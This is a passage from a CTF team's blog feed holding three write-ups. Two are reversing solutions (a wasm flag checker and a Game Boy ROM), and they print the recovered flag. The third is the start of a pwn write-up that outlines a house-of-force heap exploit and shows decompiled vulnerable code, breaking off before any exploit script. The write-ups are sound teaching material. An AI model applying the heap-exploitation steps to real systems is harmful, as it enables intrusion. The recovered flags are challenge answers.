class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">  <span class="comment">/* Make sure there is at least one command-line argument. */</span></span><br><span class="line">  <span class="keyword">if</span> (argc &lt; <span class="number">2</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Convert the argument from a string to an int. We'll implictly cast the int</span></span><br><span class="line"><span class="comment">  to a `u32`, which is what `fac` expects. */</span></span><br><span class="line">  u32 x = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">  u32 y = atoi(argv[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Initialize the fac module. Since we didn't define WASM_RT_MODULE_PREFIX,</span></span><br><span class="line"><span class="comment">  the initialization function is called `init`. */</span></span><br><span class="line">  init();</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Call `fac`, using the mangled name. */</span></span><br><span class="line">  u32 result = Z_checkZ_iii(x,y); <span class="comment">// 1048576 50</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Print the result. */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"check(%u,%u) -&gt; %u\n"</span>, x,y, result);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Let’s use gcc to compile everything:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -m32 -ggdb wasm-rt-impl.c -o wasm-rt-impl.o -c</span><br><span class="line">$ gcc -m32 -ggdb hxp2019_bg.c -o hxp2019_bg.o -c</span><br><span class="line">$ gcc -m32 -ggdb main.c -o main.o -c</span><br><span class="line"><span class="comment"># linking everything</span></span><br><span class="line">$ gcc -m32 -ggdb -o main main.o hxp2019_bg.o wasm-rt-impl.o</span><br><span class="line">$ ./main 1048576 50</span><br><span class="line">check(1048576,50) -&gt; 0</span><br></pre></td></tr></table></figure></p><p>Generating a make file so we don’t have to repeat ourselfs over and over:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">CC=gcc</span><br><span class="line">CFLAGS=-I. -ggdb -m32</span><br><span class="line">DEPS = hxp2019_bg.h wasm-rt.h wasm-rt-impl.h</span><br><span class="line">OBJ = hxp2019_bg.o wasm-rt-impl.o main.o</span><br><span class="line"></span><br><span class="line">%.o: %.c $(DEPS)</span><br><span class="line">$(CC) -c -o <span class="variable">$@</span> $&lt; $(CFLAGS)</span><br><span class="line"></span><br><span class="line">main: $(OBJ)</span><br><span class="line">$(CC) -o <span class="variable">$@</span> $^ $(CFLAGS)</span><br><span class="line">clean:</span><br><span class="line">rm *.o</span><br><span class="line">rm -f main</span><br></pre></td></tr></table></figure><p>Now we just need do <strong>make clean</strong> and make to compile everything:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ make clean</span><br><span class="line">rm *.o</span><br><span class="line">rm -f main</span><br><span class="line">$ make</span><br><span class="line">gcc -c -o hxp2019_bg.o hxp2019_bg.c -I. -ggdb -m32</span><br><span class="line">gcc -c -o wasm-rt-impl.o wasm-rt-impl.c -I. -ggdb -m32</span><br><span class="line">gcc -c -o main.o main.c -I. -ggdb -m32</span><br><span class="line">gcc -o main hxp2019_bg.o wasm-rt-impl.o main.o -I. -ggdb -m32</span><br></pre></td></tr></table></figure><p>Note that the flag <strong>-m32</strong> is to compile the binary in 32 bits and the <strong>-ggdb</strong> is to add symbols to gdb so we can debug everything and watch the source code instead of only viewing the assembly :).</p><p>Now advancing to change <strong>hxp2019_bg.c</strong> file to print us the flag on execution we need to populate the input string before doing the checks, also that loop we investigated before is only doing the checks inside of the flag brackets <strong>hxp{…}</strong>, the rest of the flag is being checked somewhere else in the code, we don’t really need to know where, we just need to populate the begining and the end with the right characters and the rest with As…</p><p>Let’s do a function that does that:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">populate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  memory.data[<span class="number">1048576u</span>+<span class="number">0</span>] = <span class="string">'h'</span>; <span class="comment">// i32_store((&amp;memory), (u64)(1048576u + 0), 'h');</span></span><br><span class="line">  memory.data[<span class="number">1048576u</span>+<span class="number">1</span>] = <span class="string">'x'</span>;</span><br><span class="line">  memory.data[<span class="number">1048576u</span>+<span class="number">2</span>] = <span class="string">'p'</span>;</span><br><span class="line">  memory.data[<span class="number">1048576u</span>+<span class="number">3</span>] = <span class="string">'&#123;'</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">4</span>; i &lt; <span class="number">49</span>; ++i) &#123;</span><br><span class="line">    memory.data[<span class="number">1048576u</span>+i] = <span class="string">'A'</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  memory.data[<span class="number">1048576u</span>+<span class="number">49</span>] = <span class="string">'&#125;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>We add this call before the check call at <strong>static u32 check(u32 p0, u32 p1)</strong>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> u32 <span class="title">check</span><span class="params">(u32 p0, u32 p1)</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line">populate();</span><br><span class="line">i0 = hxp2019__check__h578f31d490e10a31(i0, i1);</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>Now modifying <strong>hxp2019__check__h578f31d490e10a31</strong>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> u32 <span class="title">hxp2019__check__h578f31d490e10a31</span><span class="params">(u32 p0, u32 p1)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%s"</span>,<span class="string">"hxp&#123;"</span>); <span class="comment">// print flag header</span></span><br><span class="line">  ...</span><br><span class="line">  i0 = i32_load8_u((&amp;memory), (u64)(i0));</span><br><span class="line">  i1 = l6;</span><br><span class="line">  i2 = <span class="number">255u</span>;</span><br><span class="line">  i1 &amp;= i2;</span><br><span class="line">  i1 = i0; <span class="comment">// make the condition always true</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%c"</span>, i1); <span class="comment">// print current flag character</span></span><br><span class="line">  i0 = i0 == i1; <span class="comment">// condition</span></span><br><span class="line">  <span class="keyword">if</span> (i0) &#123;<span class="keyword">goto</span> L7;&#125; <span class="comment">// continue with the loop</span></span><br><span class="line">  ...</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"&#125;"</span>);</span><br><span class="line">  <span class="keyword">return</span> i0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>You can download the files <a href="https://mega.nz/#!uyRggIrK!_gls6GiG6aHIeE4xhpA2kWMmiu_acMfXXQE96TIJecA" target="_blank" rel="noopener">here</a>.</p><p>Now compiling everything with make:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ make</span><br><span class="line">gcc -c -o hxp2019_bg.o hxp2019_bg.c -I. -ggdb -m32</span><br><span class="line">gcc -c -o wasm-rt-impl.o wasm-rt-impl.c -I. -ggdb -m32</span><br><span class="line">gcc -c -o main.o main.c -I. -ggdb -m32</span><br><span class="line">gcc -o main hxp2019_bg.o wasm-rt-impl.o main.o -I. -ggdb -m32</span><br></pre></td></tr></table></figure><p>Running and getting the flag:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ./main 1048576 50</span><br><span class="line">hxp&#123;merry_xmas___github.com/benediktwerner/rewasm&#125;</span><br><span class="line">check(1048576,50) -&gt; 1</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;xmas_future&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Points&lt;/strong&gt;&lt;br&gt;96&lt;br&gt;&lt;strong&gt;Solves&lt;/strong&gt;&lt;br&gt;95&lt;br&gt;&lt;strong&gt;Category&lt;/stro
      
    
    </summary>
    
      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
    
    
      <category term="wasm" scheme="https://teamrocketist.github.io/tags/wasm/"/>
    
      <category term="36c3" scheme="https://teamrocketist.github.io/tags/36c3/"/>
    
  </entry>
  
  <entry>
    <title>[Reverse] Kipod2019 - GameBob</title>
    <link href="https://teamrocketist.github.io/2019/12/26/Reverse-Kipod2019-GameBob/"/>
    <id>https://teamrocketist.github.io/2019/12/26/Reverse-Kipod2019-GameBob/</id>
    <published>2019-12-26T12:31:45.000Z</published>
    <updated>2019-12-27T01:27:40.281Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><strong>GameBob</strong></p><p><strong>Points</strong><br>80<br><strong>Solves</strong><br>16<br><strong>Category</strong><br>Reverse</p><p><strong>Description:</strong><br>I built that small GameBoy program that just prints out the flag, and I don’t think I forgot anything. </p><p><a href="https://mega.nz/#!TupElSJa!Qs-W4_Ex3cqxmAXZlMt7Ndr0Kv-ybxZ9zTV40qfZrpM" target="_blank" rel="noopener">GameBob.gb</a><br><a href="https://mega.nz/#!yiwAyYKI!ff4asDkWe5U-Yj1CSjCS0mrH_oaX-2uw69czEvSTgVM" target="_blank" rel="noopener">GameBob.sym</a></p></blockquote><p>We have both GameBob.gb ROM and GameBob.sym which containts the symbol names to the functions which will help a lot on the reverse job.</p><p>Unlike in a previous <a href="https://teamrocketist.github.io/2017/10/16/Reverse-Square-CTF-The-Turing-Agent/">write up</a> I actually managed to work with <a href="http://bgb.bircd.org/" target="_blank" rel="noopener">bdb</a> which is a much better debugger than <a href="http://problemkaputt.de/gmb.htm" target="_blank" rel="noopener">No$GMB</a>. <strong>bgb</strong> not only has more options that also doesn’t have some random crashes that I was experience with No$GMB. Actually <strong>bgb</strong> is works in a very similar way.</p><p>Here are some of the shortcuts I used while using this debugger:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">F2 - Break Point</span><br><span class="line">F3 - Step</span><br><span class="line">F6 - Jump to Cursor (Modifies the PC(program counter) register to the address at the cursor) </span><br><span class="line">CTRL + F - Search for a string (nice to search for symbol names)</span><br><span class="line">CTRL + G - Jump to specified address</span><br></pre></td></tr></table></figure><p>After opening <strong>bgb</strong> we right click on the window to load the <strong>ROM</strong>, after that the game will start playing but the debugger window won’t show up unless we right click again (other -&gt; Debugger):<br><a data-fancybox="gallery" href="https://i.imgur.com/rXTM5i2.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/rXTM5i2.png" alt><br></a></p><p>Since we have symbols to find the main function we can just use <strong>CTRL+F</strong> and search for <strong>main</strong>, then just put a break point in the beginning with <strong>F2</strong>, note that while we are focusing the Debugger Window the game is frozen but if we click on the game window the game runs it works like a continue instruction in gdb:<br><a data-fancybox="gallery" href="https://i.imgur.com/p45TGVg.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/p45TGVg.png" alt><br></a><br>After inserting the breakpoint at the main and do some steps with <strong>F3</strong> right before executing the .</p><p>If we step over from <strong>call print_string_delayed</strong> we will see that the parameters passed to this function is the string that will be printed (“Welcome to the Game Bob”):<br><a data-fancybox="gallery" href="https://i.imgur.com/3sq40kr.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/3sq40kr.png" alt><br></a><br>If we do a few more steps we can see and after stepping over the 2nd <strong>print_string_delayed</strong> the string printed to the string will be “It’s a really easy challenge, so here is your flag”:<br><a data-fancybox="gallery" href="https://i.imgur.com/IazvRvJ.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/IazvRvJ.png" alt><br></a><br>After this a stack is created at the global flag_stack (D000):<br><a data-fancybox="gallery" href="https://i.imgur.com/UqScEDb.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/UqScEDb.png" alt><br></a></p><p>Using <strong>CTRL+G</strong> on the hexviewer to watch memory region at (D000):<br><a data-fancybox="gallery" href="https://i.imgur.com/S0RnHct.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/S0RnHct.png" alt><br></a><br>After doing multiple calls after executing <strong>call print_stack</strong> we can view in memory that multiple characters were pushed into the stack this were encrypted flag characters:<br><a data-fancybox="gallery" href="https://i.imgur.com/cSDZStr.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/cSDZStr.png" alt><br></a><br>So obviously something is missing after looking at the file with the symbols I found a function with a suspicious name called <strong>_secret</strong> which basically pops the encrypted characters from the stack and pushes the decrypted flag characters. There are no calls to this function so one of the solutions would be to patch the file, perhaps I didn’t resorted to this solution, instead I just used jumps to jump to <strong>_secret</strong> function before the arguments of <strong>print_stack</strong> call:<br><a data-fancybox="gallery" href="https://i.imgur.com/KmVsbVO.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/KmVsbVO.png" alt><br></a><br>This can be done by using the functionality <strong>jump to cursor</strong> (Shortcut F6) that the debugger offers, we could also changed the register manually at the top right corner where the registers are shown:<br><a data-fancybox="gallery" href="https://i.imgur.com/UwAANmD.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/UwAANmD.png" alt><br></a><br>Putting a break point at the end of the function (ret instruction located at 0x4da) we can see new items were pushed into the stack:<br><a data-fancybox="gallery" href="https://i.imgur.com/tLka9AU.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/tLka9AU.png" alt><br></a><br>Now jumping back back to main using <strong>jump to cursor</strong><br><a data-fancybox="gallery" href="https://i.imgur.com/UWx2ZpP.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/UWx2ZpP.png" alt><br></a><br>Now doing a couple of steps <strong>print_stack</strong> will execute and print the flag into the screen:<br><a data-fancybox="gallery" href="https://i.imgur.com/zd7d1t2.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/zd7d1t2.png" alt><br></a></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;GameBob&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Points&lt;/strong&gt;&lt;br&gt;80&lt;br&gt;&lt;strong&gt;Solves&lt;/strong&gt;&lt;br&gt;16&lt;br&gt;&lt;strong&gt;Category&lt;/strong&gt;&lt;
      
    
    </summary>
    
      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
    
    
      <category term="reverse" scheme="https://teamrocketist.github.io/tags/reverse/"/>
    
      <category term="kipod2019" scheme="https://teamrocketist.github.io/tags/kipod2019/"/>
    
      <category term="gameboy" scheme="https://teamrocketist.github.io/tags/gameboy/"/>
    
      <category term="no$gmb" scheme="https://teamrocketist.github.io/tags/no-gmb/"/>
    
      <category term="bgb" scheme="https://teamrocketist.github.io/tags/bgb/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] Kipod2019 - CloneWarS</title>
    <link href="https://teamrocketist.github.io/2019/12/26/Pwn-Kipod2019-CloneWarS/"/>
    <id>https://teamrocketist.github.io/2019/12/26/Pwn-Kipod2019-CloneWarS/</id>
    <published>2019-12-26T04:28:38.000Z</published>
    <updated>2019-12-27T00:36:46.663Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><strong>CloneWarS</strong></p><p><strong>Points</strong><br>90<br><strong>Solves</strong><br>13<br><strong>Category</strong><br>Pwn</p><p><strong>Description:</strong><br>A long time ago in a galaxy far, far away….  </p><p>ssh <a href="mailto:yeet@ctf2.kaf.sh" target="_blank" rel="noopener">yeet@ctf2.kaf.sh</a> -p 7000 password: 12345678<br><a href="https://mega.nz/#!66gyyYyB!g4AAJRtZFLVwLvlJtTGx9d-IT3prL9EDdI62hrShpDk" target="_blank" rel="noopener">CloneWarS</a></p></blockquote><h3 id="TLDR"><a href="#TLDR" class="headerlink" title="TLDR"></a>TLDR</h3><ul><li>Leak heap from R2D2</li><li>Overflow top_chunk size</li><li>Leak global file pointer</li><li>Use house of force to write into file</li><li>Trigger system(file)</li></ul><h3 id="Binary-Analysis"><a href="#Binary-Analysis" class="headerlink" title="Binary Analysis"></a>Binary Analysis</h3><p>The binary is the only file we get from this challenge:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file CloneWarS</span><br><span class="line">CloneWarS: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=a45e46d5347deb6022d64604638a3ed70e8de417, not stripped</span><br></pre></td></tr></table></figure><p>From the <strong>file</strong> command output we know that:</p><ul><li>ELF compiled for x86_x64 architecture</li><li>Dynamically linked</li><li>Not stripped</li></ul><p>Using <strong>checksec</strong> to see the enabled protections:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec CloneWarS</span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/CloneWarS/CloneWarS'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><ul><li><strong>FULL RELRO</strong> (GOT entries are read only we can’t overwrite them)</li><li><strong>STACK CANARY</strong> (The stack is protected with the canary if there is a stack overflow we need to find a way to leak it)</li><li><strong>NX</strong> (Non executable stack)</li><li><strong>PIE</strong> (Position Independent Executable) is on (If we want to use rop we need a way to leak the base address)</li></ul><h3 id="Static-Analysis"><a href="#Static-Analysis" class="headerlink" title="Static Analysis"></a>Static Analysis</h3><p>Using Ida to check on the main function we can see we have a bunch of options:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ( v3 != <span class="number">7</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1L</span>L:</span><br><span class="line">        build_death_star(); <span class="comment">// option 1</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2L</span>L:</span><br><span class="line">        R2D2(); <span class="comment">// option 2</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3L</span>L:</span><br><span class="line">        prep_starship(); <span class="comment">// option 3</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4L</span>L:</span><br><span class="line">        make_troopers(); <span class="comment">// option 4</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5L</span>L:</span><br><span class="line">        light_sabers(); <span class="comment">// option 5</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6L</span>L:</span><br><span class="line">        cm2_dark_side(); <span class="comment">// option 6</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>By looking at <strong>build_death_star</strong>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">build_death_star</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  fwrite(<span class="string">"Assemble death star: "</span>, <span class="number">1u</span>LL, <span class="number">0x15</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v1); <span class="comment">// We can control the size of the allocated string</span></span><br><span class="line">  <span class="built_in">malloc</span>(v1); <span class="comment">// allocated object (the pointer not saved anywhere)</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>As we can see above we have a controlled sized <strong>malloc</strong> this is important if we want to use certain exploits on the heap.</p><p>By looking at <strong>R2D2</strong>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">R2D2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  fwrite(<span class="string">"R2? "</span>, <span class="number">1u</span>LL, <span class="number">4u</span>LL, <span class="built_in">stderr</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%x"</span>, &amp;v1);</span><br><span class="line">  v2 = (<span class="keyword">char</span> *)starships + <span class="number">272</span>;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nR2D2 IS .... %ld ...... ON THIS TRACK !! 0x6733894F08\n"</span>, (<span class="keyword">char</span> *)starships + <span class="number">272</span>);<span class="comment">// Leak Heap</span></span><br><span class="line">  getchar();</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>R2D2</strong> gives us a <strong>free leak</strong> to the heap because of this we can calculate the offset to the <strong>HEAP BASE</strong>.</p><p>Checking out theprep_starship:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">prep_starship</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-2Ch]</span></span><br><span class="line">  <span class="keyword">int</span> c; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+Ch] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  fwrite(<span class="string">"Master, the amount of starships: "</span>, <span class="number">1u</span>LL, <span class="number">0x21</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v1); <span class="comment">// reads size from the stdin</span></span><br><span class="line">  starships = <span class="built_in">malloc</span>(v1); <span class="comment">// a new allocated starship with a controllable size</span></span><br><span class="line">  c = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  fwrite(<span class="string">"\nWhat kind of starships?: "</span>, <span class="number">1u</span>LL, <span class="number">0x1A</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%x"</span>, &amp;c); <span class="comment">// Value to be set</span></span><br><span class="line">  fwrite(<span class="string">"\nCapacity of troopers in the starships: "</span>, <span class="number">1u</span>LL, <span class="number">0x28</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v3); <span class="comment">// Number of bytes</span></span><br><span class="line">  <span class="built_in">memset</span>(starships, c, v3); <span class="comment">// Heap Overflow</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>As you can see because of <strong>memset</strong> we can overflow the heap by an amount we can control (capacity of the troppers) and we can also control the content that will overflow it (kind of starships).</p><p>Analysing <strong>make_troopers</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">make_troopers</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="keyword">char</span> *dest; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">char</span> src[<span class="number">8</span>]; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  fwrite(<span class="string">"\nTroopers to be deployed: "</span>, <span class="number">1u</span>LL, <span class="number">0x1A</span>uLL, <span class="built_in">stderr</span>);</span><br><span class="line">  read(<span 